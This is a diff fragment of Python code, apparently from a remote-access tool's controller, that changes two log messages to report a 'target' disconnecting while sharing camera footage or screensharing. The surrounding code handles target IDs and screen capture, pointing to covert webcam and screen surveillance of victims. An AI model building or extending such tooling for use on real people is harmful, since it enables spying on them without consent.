@@ -215,7 +215,7 @@ ID: {targets_list[g]["id"]}
                             break 
 
                     except ConnectionResetError:
-                        print("[LOG] Target disconnected.")
+                        print("[LOG] Target disconnected while sharing camera footage.")
                         break
 
 
@@ -270,7 +270,7 @@ ID: {targets_list[g]["id"]}
                             ts.send(bytes('N'.encode()))
                             break            
                     except ConnectionResetError:        
-                        print("[LOG] Target disconnected.")
+                        print("[LOG] Target disconnected while screensharing.")
                         break
 
                 print('[COMMAND] Finished sending screen capture.')       
